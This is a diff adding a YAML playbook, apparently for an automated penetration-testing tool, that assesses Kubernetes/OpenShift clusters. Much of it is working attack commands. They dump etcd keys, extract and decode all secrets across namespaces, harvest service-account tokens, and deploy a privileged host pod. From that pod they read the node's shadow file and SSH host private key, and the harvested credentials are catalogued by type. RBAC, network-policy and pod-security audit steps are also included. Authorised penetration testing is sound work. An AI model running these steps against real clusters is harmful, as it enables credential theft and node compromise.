@@ -1,0 +1,451 @@
+name: "Kubernetes Cluster Security Assessment"
+description: >
+  Comprehensive authenticated Kubernetes/OpenShift cluster security assessment.
+  Covers etcd enumeration, secret extraction, RBAC abuse, service exploitation,
+  pod security, network policy review, credential harvesting, and lateral movement.
+  Designed for pentesters with cluster-level access (kubeconfig/oc login).
+version: "2.0"
+target_required: false
+vars:
+  target_domain: ""
+  kubeconfig_path: ""
+  namespace: ""
+  skip_etcd: false
+vars_description:
+  target_domain: "Cluster domain (e.g., apps.okd.cluster.local)"
+  kubeconfig_path: "Path to kubeconfig file or leave empty for in-cluster"
+  namespace: "Specific namespace to assess, or empty for all"
+  skip_etcd: "Set to true if etcd is not accessible"
+preflight:
+  name: preflight_check
+  description: "Verify cluster access and tool availability"
+  steps:
+    - name: tool_check
+      description: "Verify kubectl/oc and cluster access"
+      command: >
+        which kubectl oc etcdctl curl jq python3 2>&1;
+        kubectl version --short 2>&1 | head -3;
+        kubectl auth can-i '*' '*' 2>&1 | head -3;
+        kubectl get nodes 2>&1 | head -5
+    - name: cluster_info
+      description: "Gather basic cluster information"
+      command: >
+        echo "=== Cluster Info ===";
+        kubectl cluster-info 2>&1;
+        echo "=== Nodes ===";
+        kubectl get nodes -o wide 2>&1;
+        echo "=== Namespaces ===";
+        kubectl get namespaces 2>&1;
+        echo "=== API Versions ===";
+        kubectl api-versions 2>&1 | head -20
+steps:
+  - name: preamble
+    description: "Create output directory structure"
+    command: >
+      mkdir -p "{case_dir}/etcd" "{case_dir}/secrets" "{case_dir}/rbac"
+      "{case_dir}/services" "{case_dir}/pods" "{case_dir}/network"
+      "{case_dir}/credentials" "{case_dir}/report"{newline}
+      echo "Directories created" > "{case_dir}/preamble.txt"
+  - name: etcd_cert_discovery
+    description: "Find etcd client certificates on control plane nodes"
+    command: >
+      echo "=== etcd certificate discovery ===" > "{case_dir}/etcd/etcd_discovery.txt{newline}"
+      kubectl get nodes -l node-role.kubernetes.io/master --no-headers 2>/dev/null | awk '{print $1}' > /tmp/etcd_master_nodes.txt;
+      kubectl get nodes -l node-role.kubernetes.io/control-plane --no-headers 2>/dev/null | awk '{print $1}' >> /tmp/etcd_master_nodes.txt;
+      echo "Control plane nodes:" >> "{case_dir}/etcd/etcd_discovery.txt";
+      cat /tmp/etcd_master_nodes.txt >> "{case_dir}/etcd/etcd_discovery.txt";
+      echo "" >> "{case_dir}/etcd/etcd_discovery.txt";
+      echo "Check /etc/kubernetes/static-pod-resources/etcd-member/" >> "{case_dir}/etcd/etcd_discovery.txt";
+      echo "Common cert locations:" >> "{case_dir}/etcd/etcd_discovery.txt";
+      echo "  /etc/kubernetes/pki/etcd/" >> "{case_dir}/etcd/etcd_discovery.txt";
+      echo "  /etc/ssl/etcd/" >> "{case_dir}/etcd/etcd_discovery.txt";
+      echo "  /var/lib/etcd/" >> "{case_dir}/etcd/etcd_discovery.txt";
+      rm -f /tmp/etcd_master_nodes.txt
+  - name: etcd_endpoint_check
+    description: "Discover etcd endpoints (internal and external)"
+    command: >
+      echo "=== etcd endpoints ===" > "{case_dir}/etcd/etcd_endpoints.txt{newline}"
+      echo "Internal DNS:" >> "{case_dir}/etcd/etcd_endpoints.txt";
+      kubectl get svc -n kube-system 2>/dev/null | grep -i etcd >> "{case_dir}/etcd/etcd_endpoints.txt";
+      echo "" >> "{case_dir}/etcd/etcd_endpoints.txt";
+      echo "etcd pods:" >> "{case_dir}/etcd/etcd_endpoints.txt";
+      kubectl get pods -n kube-system 2>/dev/null | grep etcd >> "{case_dir}/etcd/etcd_endpoints.txt";
+      echo "" >> "{case_dir}/etcd/etcd_endpoints.txt";
+      echo "Check for etcd on 0.0.0.0:" >> "{case_dir}/etcd/etcd_endpoints.txt";
+      echo "  etcd should bind to localhost, not 0.0.0.0" >> "{case_dir}/etcd/etcd_endpoints.txt"
+  - name: etcd_key_dump
+    condition: "not {skip_etcd}"
+    description: "Dump etcd key space when client certs are available"
+    command: >
+      echo "=== etcd key space dump ===" > "{case_dir}/etcd/etcd_dump.txt{newline}"
+      for cert_dir in /etc/kubernetes/static-pod-resources/etcd-member/etcd-all-certs/
+                      /etc/kubernetes/pki/etcd/ /var/lib/etcd/; do
+        if [ -d "$cert_dir" ]; then
+          echo "Found certs in: $cert_dir" >> "{case_dir}/etcd/etcd_dump.txt";
+          ls -la "$cert_dir" >> "{case_dir}/etcd/etcd_dump.txt";
+          ca=$(find "$cert_dir" -name "*ca*" -o -name "*CA*" 2>/dev/null | head -1);
+          cert=$(find "$cert_dir" -name "*client*crt*" -o -name "*peer*crt*" 2>/dev/null | head -1);
+          key=$(find "$cert_dir" -name "*client*key*" -o -name "*peer*key*" 2>/dev/null | head -1);
+          if [ -n "$ca" ] && [ -n "$cert" ] && [ -n "$key" ]; then
+            echo "Using: ca=$ca cert=$cert key=$key" >> "{case_dir}/etcd/etcd_dump.txt";
+            ETCDCTL_API=3 etcdctl --cacert="$ca" --cert="$cert" --key="$key" \
+              get "" --prefix --keys-only 2>&1 | head -200 >> "{case_dir}/etcd/etcd_dump.txt";
+            echo "---" >> "{case_dir}/etcd/etcd_dump.txt";
+            ETCDCTL_API=3 etcdctl --cacert="$ca" --cert="$cert" --key="$key" \
+              get "" --prefix --keys-only 2>&1 | wc -l >> "{case_dir}/etcd/etcd_dump.txt";
+            echo "total keys" >> "{case_dir}/etcd/etcd_dump.txt";
+            break;
+          fi;
+        fi;
+      done;
+      echo "" >> "{case_dir}/etcd/etcd_dump.txt";
+      echo "If etcdctl not available, try port-forward:" >> "{case_dir}/etcd/etcd_dump.txt";
+      echo "  kubectl port-forward -n kube-system pod/etcd-<node> 2379:2379" >> "{case_dir}/etcd/etcd_dump.txt"
+  - name: secret_extraction
+    description: "Extract all Kubernetes secrets across all namespaces"
+    command: >
+      echo "=== Secret extraction ===" > "{case_dir}/secrets/all_secrets.txt{newline}"
+      for ns in $(kubectl get ns --no-headers 2>/dev/null | awk '{print $1}'); do
+        echo "--- Namespace: $ns ---" >> "{case_dir}/secrets/all_secrets.txt";
+        kubectl get secrets -n "$ns" --no-headers 2>/dev/null | awk '{print $1","$2}' >> "{case_dir}/secrets/all_secrets.txt";
+        # Extract all secret data in detail
+        for sec in $(kubectl get secrets -n "$ns" --no-headers 2>/dev/null | awk '{print $1}'); do
+          mkdir -p "{case_dir}/secrets/${ns}" 2>/dev/null;
+          kubectl get secret "$sec" -n "$ns" -o json > "{case_dir}/secrets/${ns}/${sec}.json" 2>/dev/null;
+          # Decode base64 data and check for credentials
+          python3 -c "
+import json, base64, sys
+try:
+    data = json.load(open('{case_dir}/secrets/${ns}/${sec}.json'))
+    if 'data' in data:
+        for k,v in data['data'].items():
+            try:
+                decoded = base64.b64decode(v).decode('utf-8')
+                if any(x in decoded.lower() for x in ['password','secret','token','key','credential',
+                    'api_key','apikey','access_key','secret_key','auth','passwd','pwd',
+                    'ssh','certificate','private_key','connection_string','jwt']):
+                    with open('{case_dir}/secrets/creds_found.txt','a') as f:
+                        f.write(f'[\$ns.\$sec] {k}: {decoded[:200]}' + chr(10))
+                    print(f'  CRED: \$ns.\$sec.{k}')
+                elif any(x in k.lower() for x in ['token','key','secret','password','cert']):
+                    print(f'  TOKEN: \$ns.\$sec.{k} = {decoded[:80]}...')
+            except:
+                pass
+except: pass
+" 2>&1 >> "{case_dir}/secrets/all_secrets.txt";
+        done;
+      done
+  - name: sa_token_extraction
+    description: "Extract service account tokens and identify cluster-admin tokens"
+    command: >
+      echo "=== Service Account Token Extraction ===" > "{case_dir}/rbac/sa_tokens.txt{newline}"
+      echo "--- ClusterRoleBindings ---" >> "{case_dir}/rbac/sa_tokens.txt";
+      kubectl get clusterrolebindings -o wide 2>/dev/null >> "{case_dir}/rbac/sa_tokens.txt";
+      echo "" >> "{case_dir}/rbac/sa_tokens.txt";
+      echo "--- Cluster-admin subjects ---" >> "{case_dir}/rbac/sa_tokens.txt";
+      kubectl describe clusterrolebinding cluster-admin 2>/dev/null >> "{case_dir}/rbac/sa_tokens.txt";
+      echo "" >> "{case_dir}/rbac/sa_tokens.txt";
+      echo "--- All cluster-admin bindings ---" >> "{case_dir}/rbac/sa_tokens.txt";
+      kubectl get clusterrolebindings -o json 2>/dev/null | python3 -c "
+import json, sys
+try:
+    data = json.load(sys.stdin)
+    for crb in data.get('items',[]):
+        if crb.get('roleRef',{}).get('name') == 'cluster-admin':
+            print(f'  {crb[\"metadata\"][\"name\"]}')
+            for sub in crb.get('subjects',[]):
+                print(f'    {sub.get(\"kind\")}: {sub.get(\"name\")} (ns: {sub.get(\"namespace\",\"\")})')
+except: pass
+" >> "{case_dir}/rbac/sa_tokens.txt";
+      echo "" >> "{case_dir}/rbac/sa_tokens.txt";
+      echo "--- Token extraction ---" >> "{case_dir}/rbac/sa_tokens.txt";
+      for ns in $(kubectl get ns --no-headers 2>/dev/null | awk '{print $1}'); do
+        for sa in $(kubectl get sa -n "$ns" --no-headers 2>/dev/null | awk '{print $1}'); do
+          kubectl get secret -n "$ns" "$(kubectl get sa "$sa" -n "$ns" -o json 2>/dev/null | python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get('secrets',[{}])[0].get('name',''))" 2>/dev/null)" -o json 2>/dev/null | python3 -c "
+import json, base64, sys
+try:
+    data = json.load(sys.stdin)
+    tok = data.get('data',{}).get('token','')
+    if tok:
+        decoded = base64.b64decode(tok).decode()
+        print(f'  [$ns/$sa] token: {decoded[:80]}...')
+        # Check if it can do cluster-admin actions
+except: pass
+" >> "{case_dir}/rbac/sa_tokens.txt" 2>/dev/null;
+        done;
+      done
+  - name: rbac_audit
+    description: "Audit RBAC for privilege escalation vectors"
+    command: >
+      echo "=== RBAC Audit ===" > "{case_dir}/rbac/rbac_audit.txt{newline}"
+      echo "--- Current user permissions ---" >> "{case_dir}/rbac/rbac_audit.txt";
+      kubectl auth can-i --list 2>/dev/null >> "{case_dir}/rbac/rbac_audit.txt";
+      echo "" >> "{case_dir}/rbac/rbac_audit.txt";
+      echo "--- Can create pods? ---" >> "{case_dir}/rbac/rbac_audit.txt";
+      kubectl auth can-i create pods 2>/dev/null >> "{case_dir}/rbac/rbac_audit.txt";
+      echo "--- Can create pods/exec? ---" >> "{case_dir}/rbac/rbac_audit.txt";
+      kubectl auth can-i create pods/exec 2>/dev/null >> "{case_dir}/rbac/rbac_audit.txt";
+      echo "--- Can get secrets? ---" >> "{case_dir}/rbac/rbac_audit.txt";
+      kubectl auth can-i get secrets --all-namespaces 2>/dev/null >> "{case_dir}/rbac/rbac_audit.txt";
+      echo "--- Can create clusterroles? ---" >> "{case_dir}/rbac/rbac_audit.txt";
+      kubectl auth can-i create clusterroles 2>/dev/null >> "{case_dir}/rbac/rbac_audit.txt";
+      echo "--- Can create clusterrolebindings? ---" >> "{case_dir}/rbac/rbac_audit.txt";
+      kubectl auth can-i create clusterrolebindings 2>/dev/null >> "{case_dir}/rbac/rbac_audit.txt";
+      echo "" >> "{case_dir}/rbac/rbac_audit.txt";
+      echo "--- Wildcard clusterroles ---" >> "{case_dir}/rbac/rbac_audit.txt";
+      kubectl get clusterroles -o json 2>/dev/null | python3 -c "
+import json, sys
+data = json.load(sys.stdin)
+for cr in data.get('items',[]):
+    for rule in cr.get('rules',[]):
+        for apiGroup in rule.get('apiGroups',[]):
+            for resource in rule.get('resources',[]):
+                for verb in rule.get('verbs',[]):
+                    if resource == '*' and verb == '*':
+                        print(f'  WILDCARD: {cr[\"metadata\"][\"name\"]}')
+" >> "{case_dir}/rbac/rbac_audit.txt"
+  - name: privileged_pod_deploy
+    description: "Deploy a privileged pod for node-level access (if permitted by RBAC)"
+    command: >
+      echo "=== Privileged pod deployment ===" > "{case_dir}/pods/privileged_pod.txt{newline}"
+      kubectl auth can-i create pods 2>/dev/null | grep -q yes && {
+        cat << 'PRIVEOF' | kubectl apply -f - 2>&1 >> "{case_dir}/pods/privileged_pod.txt";
+apiVersion: v1
+kind: Pod
+metadata:
+  name: pentest-privileged-$(date +%s)
+  namespace: default
+spec:
+  hostPID: true
+  hostNetwork: true
+  containers:
+  - name: alpine
+    image: alpine:latest
+    securityContext:
+      privileged: true
+    command: ["sh", "-c", "sleep 3600"]
+  automountServiceAccountToken: true
+PRIVEOF
+        echo "Privileged pod created" >> "{case_dir}/pods/privileged_pod.txt";
+        PN=$(kubectl get pods -n default -o name 2>/dev/null | grep pentest-privileged | head -1 | cut -d/ -f2);
+        if [ -n "$PN" ]; then
+          kubectl exec -n default "$PN" -- chroot /host cat /etc/shadow 2>/dev/null > "{case_dir}/credentials/host_shadow.txt";
+          kubectl exec -n default "$PN" -- chroot /host cat /etc/passwd 2>/dev/null > "{case_dir}/credentials/host_passwd.txt";
+          kubectl exec -n default "$PN" -- chroot /host cat /etc/ssh/ssh_host_rsa_key 2>/dev/null > "{case_dir}/credentials/host_ssh_key.txt";
+          kubectl exec -n default "$PN" -- chroot /host ps aux 2>/dev/null > "{case_dir}/pods/host_processes.txt";
+          echo "Host access achieved" >> "{case_dir}/pods/privileged_pod.txt";
+          kubectl delete pod "$PN" -n default 2>/dev/null;
+        fi;
+      } || echo "Cannot create pods - check RBAC" >> "{case_dir}/pods/privileged_pod.txt"
+  - name: ingress_service_audit
+    description: "Audit services, ingresses, and routes for exposed admin interfaces"
+    command: >
+      echo "=== Service & Ingress Audit ===" > "{case_dir}/services/service_audit.txt{newline}"
+      echo "--- Services of type NodePort/LoadBalancer ---" >> "{case_dir}/services/service_audit.txt";
+      kubectl get svc --all-namespaces -o wide 2>/dev/null | grep -E "(NodePort|LoadBalancer)" >> "{case_dir}/services/service_audit.txt";
+      echo "" >> "{case_dir}/services/service_audit.txt";
+      echo "--- Ingresses ---" >> "{case_dir}/services/service_audit.txt";
+      kubectl get ingress --all-namespaces 2>/dev/null >> "{case_dir}/services/service_audit.txt";
+      echo "" >> "{case_dir}/services/service_audit.txt";
+      echo "--- Routes (OpenShift) ---" >> "{case_dir}/services/service_audit.txt";
+      kubectl get route --all-namespaces 2>/dev/null >> "{case_dir}/services/service_audit.txt";
+      echo "" >> "{case_dir}/services/service_audit.txt";
+      echo "--- Exposed admin panels ---" >> "{case_dir}/services/service_audit.txt";
+      kubectl get ingress --all-namespaces -o json 2>/dev/null | python3 -c "
+import json, sys
+try:
+    data = json.load(sys.stdin)
+    for item in data.get('items',[]):
+        name = item['metadata']['name']
+        ns = item['metadata']['namespace']
+        host = item['spec'].get('rules',[{}])[0].get('host','')
+        if any(x in name.lower() for x in ['admin','dashboard','grafana','kibana','argocd',
+            'jenkins','k8s','kubernetes','api','manager','operator','console','monitor']):
+            print(f'  {ns}/{name} -> {host}')
+except: pass
+" >> "{case_dir}/services/service_audit.txt"
+  - name: database_service_check
+    description: "Check for exposed database services and default credentials"
+    command: >
+      echo "=== Database Services ===" > "{case_dir}/services/databases.txt{newline}"
+      kubectl get statefulset --all-namespaces -o json 2>/dev/null | python3 -c "
+import json, sys
+try:
+    data = json.load(sys.stdin)
+    for item in data.get('items',[]):
+        name = item['metadata']['name']
+        ns = item['metadata']['namespace']
+        img = item['spec']['template']['spec']['containers'][0]['image']
+        if any(x in img.lower() for x in ['postgres','mysql','mariadb','mongodb','couchdb',
+            'redis','elasticsearch','opensearch','minio','n8n']):
+            print(f'  {ns}/{name} image={img}')
+            envs = item['spec']['template']['spec']['containers'][0].get('env',[])
+            for env in envs:
+                val = env.get('value','')
+                if any(x in val.lower() for x in ['password','secret','key','connection']):
+                    print(f'    ENV: {env[\"name\"]}={val[:80]}')
+                elif env.get('valueFrom',{}).get('secretKeyRef',{}).get('name'):
+                    ref = env['valueFrom']['secretKeyRef']
+                    print(f'    ENV: {env[\"name\"]} -> secret/{ref[\"name\"]}/{ref[\"key\"]}')
+except: pass
+" >> "{case_dir}/services/databases.txt"
+  - name: credential_catalog
+    description: "Catalog all harvested credentials by type"
+    command: >
+      echo "=== Credential Catalog ===" > "{case_dir}/credentials/credential_catalog.txt{newline}"
+      echo "SSH Keys:" >> "{case_dir}/credentials/credential_catalog.txt";
+      find "{case_dir}/secrets" -name "*.json" -exec grep -l -E "(ssh|private_key|authorized_keys)" {{}} \; 2>/dev/null >> "{case_dir}/credentials/credential_catalog.txt";
+      echo "" >> "{case_dir}/credentials/credential_catalog.txt";
+      echo "API Keys:" >> "{case_dir}/credentials/credential_catalog.txt";
+      grep -r -E "(api_key|apikey|token)" "{case_dir}/secrets/creds_found.txt" 2>/dev/null >> "{case_dir}/credentials/credential_catalog.txt";
+      echo "" >> "{case_dir}/credentials/credential_catalog.txt";
+      echo "Database Credentials:" >> "{case_dir}/credentials/credential_catalog.txt";
+      grep -r -E "(postgres|mysql|mongodb|redis|database|jdbc|connection)" "{case_dir}/secrets/creds_found.txt" 2>/dev/null >> "{case_dir}/credentials/credential_catalog.txt";
+      echo "" >> "{case_dir}/credentials/credential_catalog.txt";
+      echo "Cloud Provider Keys:" >> "{case_dir}/credentials/credential_catalog.txt";
+      grep -r -E "(aws|gcp|azure|cloudflare|digitalocean)" "{case_dir}/secrets/creds_found.txt" 2>/dev/null >> "{case_dir}/credentials/credential_catalog.txt";
+      echo "" >> "{case_dir}/credentials/credential_catalog.txt";
+      echo "OAuth/SSO:" >> "{case_dir}/credentials/credential_catalog.txt";
+      grep -r -E "(oauth|oidc|saml|google|github|gitlab)" "{case_dir}/secrets/creds_found.txt" 2>/dev/null >> "{case_dir}/credentials/credential_catalog.txt";
+      echo "" >> "{case_dir}/credentials/credential_catalog.txt";
+      echo "Financial:" >> "{case_dir}/credentials/credential_catalog.txt";
+      grep -r -E "(stripe|paypal|square|bank|payment|card)" "{case_dir}/secrets/creds_found.txt" 2>/dev/null >> "{case_dir}/credentials/credential_catalog.txt"
+  - name: kubelet_api_check
+    description: "Check kubelet API access (port 10250) with extracted certificates"
+    command: >
+      echo "=== Kubelet API Access ===" > "{case_dir}/rbac/kubelet_access.txt{newline}"
+      echo "Kubelet API on port 10250 (authn/authz)" >> "{case_dir}/rbac/kubelet_access.txt";
+      echo "Kubelet read-only on port 10255 (deprecated)" >> "{case_dir}/rbac/kubelet_access.txt";
+      echo "" >> "{case_dir}/rbac/kubelet_access.txt";
+      for node in $(kubectl get nodes --no-headers 2>/dev/null | awk '{print $1}'); do
+        echo "--- Node: $node ---" >> "{case_dir}/rbac/kubelet_access.txt";
+        kubectl get node "$node" -o json 2>/dev/null | python3 -c "
+import json, sys
+try:
+    d = json.load(sys.stdin)
+    for addr in d['status']['addresses']:
+        print(f'  {addr[\"type\"]}: {addr[\"address\"]}')
+except: pass
+" >> "{case_dir}/rbac/kubelet_access.txt";
+      done;
+      echo "" >> "{case_dir}/rbac/kubelet_access.txt";
+      echo "Testing kubelet API (requires node IPs):" >> "{case_dir}/rbac/kubelet_access.txt";
+      echo "  curl -sk https://<node-ip>:10250/pods" >> "{case_dir}/rbac/kubelet_access.txt";
+      echo "  curl -sk https://<node-ip>:10250/run/<ns>/<pod>/<container>" >> "{case_dir}/rbac/kubelet_access.txt"
+  - name: network_policy_review
+    description: "Review network policies for namespace isolation gaps"
+    command: >
+      echo "=== Network Policy Review ===" > "{case_dir}/network/network_policies.txt{newline}"
+      echo "--- All NetworkPolicies ---" >> "{case_dir}/network/network_policies.txt";
+      kubectl get networkpolicies --all-namespaces 2>/dev/null >> "{case_dir}/network/network_policies.txt";
+      echo "" >> "{case_dir}/network/network_policies.txt";
+      echo "--- Namespaces WITHOUT network policies ---" >> "{case_dir}/network/network_policies.txt";
+      kubectl get ns -o json 2>/dev/null | python3 -c "
+import json, sys
+data = json.load(sys.stdin)
+all_ns = set(ns['metadata']['name'] for ns in data['items'])
+import subprocess, os
+pol_ns = set()
+result = subprocess.run(['kubectl','get','networkpolicies','--all-namespaces','-o','json'], capture_output=True, text=True)
+if result.returncode == 0:
+    pol_data = json.loads(result.stdout)
+    for item in pol_data.get('items',[]):
+        pol_ns.add(item['metadata']['namespace'])
+unprotected = all_ns - pol_ns
+for ns in sorted(unprotected):
+    if not ns.startswith('kube-') and ns != 'default':
+        print(f'  NO POLICY: {ns}')
+" >> "{case_dir}/network/network_policies.txt"
+  - name: pod_security_audit
+    description: "Audit pod security contexts for privileged, hostNetwork, hostPID, and root containers"
+    command: >
+      echo "=== Pod Security Audit ===" > "{case_dir}/pods/pod_security.txt{newline}"
+      kubectl get pods --all-namespaces -o json 2>/dev/null | python3 -c "
+import json, sys, os
+data = json.load(sys.stdin)
+findings = []
+for item in data.get('items',[]):
+    ns = item['metadata']['namespace']
+    name = item['metadata']['name']
+    containers = item['spec'].get('containers',[]) + item['spec'].get('initContainers',[])
+    for c in containers:
+        sc = c.get('securityContext',{}) or {}
+        if sc.get('privileged'):
+            findings.append(f'  PRIVILEGED: {ns}/{name} container={c[\"name\"]}')
+        if sc.get('runAsUser') == 0 or item['spec'].get('securityContext',{}).get('runAsUser') == 0:
+            findings.append(f'  ROOT: {ns}/{name} container={c[\"name\"]}')
+    if item['spec'].get('hostNetwork'):
+        findings.append(f'  HOST_NETWORK: {ns}/{name}')
+    if item['spec'].get('hostPID'):
+        findings.append(f'  HOST_PID: {ns}/{name}')
+    if item['spec'].get('hostPath'):
+        findings.append(f'  HOST_PATH: {ns}/{name}')
+for f in findings:
+    print(f)
+" >> "{case_dir}/pods/pod_security.txt";
+      echo "" >> "{case_dir}/pods/pod_security.txt";
+      echo "--- Pods with dangerous capabilities ---" >> "{case_dir}/pods/pod_security.txt";
+      kubectl get pods --all-namespaces -o json 2>/dev/null | python3 -c "
+import json, sys
+data = json.load(sys.stdin)
+for item in data.get('items',[]):
+    ns = item['metadata']['namespace']
+    name = item['metadata']['name']
+    containers = item['spec'].get('containers',[])
+    for c in containers:
+        caps = c.get('securityContext',{}).get('capabilities',{}).get('add',[])
+        if caps:
+            print(f'  CAP_ADD: {ns}/{name} container={c[\"name\"]} caps={caps}')
+" >> "{case_dir}/pods/pod_security.txt"
+  - name: report_compile
+    description: "Compile comprehensive assessment report"
+    command: >
+      echo "# Kubernetes Cluster Security Assessment Report" > "{case_dir}/report/final_report.md{newline}"
+      echo "Target: {target_domain}" >> "{case_dir}/report/final_report.md";
+      echo "Date: $(date -u)" >> "{case_dir}/report/final_report.md";
+      echo "" >> "{case_dir}/report/final_report.md";
+      echo "## 1. etcd Security" >> "{case_dir}/report/final_report.md";
+      wc -l "{case_dir}/etcd/etcd_discovery.txt" 2>/dev/null | awk '{printf("- etcd discovery: %s lines\n", \$1)}' >> "{case_dir}/report/final_report.md";
+      if grep -q total "{case_dir}/etcd/etcd_dump.txt" 2>/dev/null; then
+        TOTAL=$(grep -E "^[0-9]+$" "{case_dir}/etcd/etcd_dump.txt" 2>/dev/null | tail -1);
+        echo "- etcd accessible: YES, $TOTAL keys readable" >> "{case_dir}/report/final_report.md";
+        echo "- **CRITICAL**: etcd exposes ALL cluster secrets. Restrict cert access." >> "{case_dir}/report/final_report.md";
+      else
+        echo "- etcd accessible: NO (expected if no cert access)" >> "{case_dir}/report/final_report.md";
+      fi;
+      echo "" >> "{case_dir}/report/final_report.md";
+      echo "## 2. Secrets Exposure" >> "{case_dir}/report/final_report.md";
+      if [ -f "{case_dir}/secrets/creds_found.txt" ]; then
+        wc -l "{case_dir}/secrets/creds_found.txt" 2>/dev/null | awk '{printf("- Credentials found: %s entries\n", \$1)}' >> "{case_dir}/report/final_report.md";
+        echo "- Review all secrets for over-privileged access" >> "{case_dir}/report/final_report.md";
+        echo "- Check for external service API keys (cloud, payment, email)" >> "{case_dir}/report/final_report.md";
+      fi;
+      echo "" >> "{case_dir}/report/final_report.md";
+      echo "## 3. RBAC" >> "{case_dir}/report/final_report.md";
+      if grep -q WILDCARD "{case_dir}/rbac/rbac_audit.txt" 2>/dev/null; then
+        echo "- **WILDCARD clusterroles detected** - excessive permissions" >> "{case_dir}/report/final_report.md";
+      fi;
+      if grep -q cluster-admin "{case_dir}/rbac/sa_tokens.txt" 2>/dev/null; then
+        echo "- **Cluster-admin tokens found** - review bindings" >> "{case_dir}/report/final_report.md";
+      fi;
+      echo "" >> "{case_dir}/report/final_report.md";
+      echo "## 4. Pod Security" >> "{case_dir}/report/final_report.md";
+      if [ -s "{case_dir}/pods/pod_security.txt" ]; then
+        cat "{case_dir}/pods/pod_security.txt" >> "{case_dir}/report/final_report.md";
+      else
+        echo "- No privileged/root containers found" >> "{case_dir}/report/final_report.md";
+      fi;
+      echo "" >> "{case_dir}/report/final_report.md";
+      echo "## 5. Network Policy" >> "{case_dir}/report/final_report.md";
+      UNPROTECTED=$(grep -c "NO POLICY" "{case_dir}/network/network_policies.txt" 2>/dev/null);
+      echo "- Namespaces without network policies: $UNPROTECTED" >> "{case_dir}/report/final_report.md";
+      echo "" >> "{case_dir}/report/final_report.md";
+      echo "## 6. Credential Inventory" >> "{case_dir}/report/final_report.md";
+      wc -l "{case_dir}/credentials/credential_catalog.txt" 2>/dev/null | awk '{printf("- Credential catalog: %s lines\n", \$1)}' >> "{case_dir}/report/final_report.md"
+postflight:
+  - name: cleanup
+    description: "Delete privileged pod and temporary files"
+    command: >
+      kubectl delete pod pentest-privileged -n default --ignore-not-found 2>/dev/null;
+      rm -f /tmp/etcd_master_nodes.txt 2>/dev/null;
+      echo "Cleanup done" > "{case_dir}/cleanup.txt"
